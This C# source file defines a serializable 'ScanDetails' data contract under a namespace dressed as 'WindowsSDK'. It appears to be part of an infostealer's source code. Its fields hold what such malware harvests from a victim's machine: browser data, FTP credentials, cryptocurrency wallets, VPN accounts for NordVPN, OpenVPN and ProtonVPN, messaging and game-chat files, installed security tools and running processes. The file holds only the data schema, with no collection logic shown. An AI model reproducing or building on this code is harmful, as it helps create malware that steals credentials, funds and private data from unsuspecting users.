using System.Collections.Generic;
using System.Runtime.Serialization;
using WindowsSDK.Objects.Browsers;

namespace WindowsSDK.Objects.Info
{
    [DataContract(Name = "ScanDetails", Namespace = "BrowserExtension")]
    public class ScanDetails
    {
        [DataMember(Name = "SecurityUtils")]
        public List<string> SecurityUtils { get; set; } = new List<string>();


        [DataMember(Name = "AvailableLanguages")]
        public List<string> AvailableLanguages { get; set; } = new List<string>();


        [DataMember(Name = "Softwares")]
        public List<string> Softwares { get; set; } = new List<string>();


        [DataMember(Name = "Processes")]
        public List<string> Processes { get; set; } = new List<string>();


        [DataMember(Name = "SystemHardwares")]
        public List<SystemHardware> SystemHardwares { get; set; } = new List<SystemHardware>();


        [DataMember(Name = "Browsers")]
        public List<ScannedBrowser> Browsers { get; set; } = new List<ScannedBrowser>();


        [DataMember(Name = "FtpConnections")]
        public List<Account> FtpConnections { get; set; } = new List<Account>();


        [DataMember(Name = "InstalledBrowsers")]
        public List<BrowserVersion> InstalledBrowsers { get; set; } = new List<BrowserVersion>();


        [DataMember(Name = "ScannedFiles")]
        public List<ScannedFile> ScannedFiles { get; set; } = new List<ScannedFile>();


        [DataMember(Name = "GameLauncherFiles")]
        public List<ScannedFile> GameLauncherFiles { get; set; } = new List<ScannedFile>();


        [DataMember(Name = "ScannedWallets")]
        public List<ScannedFile> ScannedWallets { get; set; } = new List<ScannedFile>();


        [DataMember(Name = "Nord")]
        public List<Account> Nord { get; set; }

        [DataMember(Name = "Open")]
        public List<ScannedFile> Open { get; set; }

        [DataMember(Name = "Proton")]
        public List<ScannedFile> Proton { get; set; }

        [DataMember(Name = "MessageClientFiles")]
        public List<ScannedFile> MessageClientFiles { get; set; }

        [DataMember(Name = "GameChatFiles")]
        public List<ScannedFile> GameChatFiles { get; set; }
    }
}
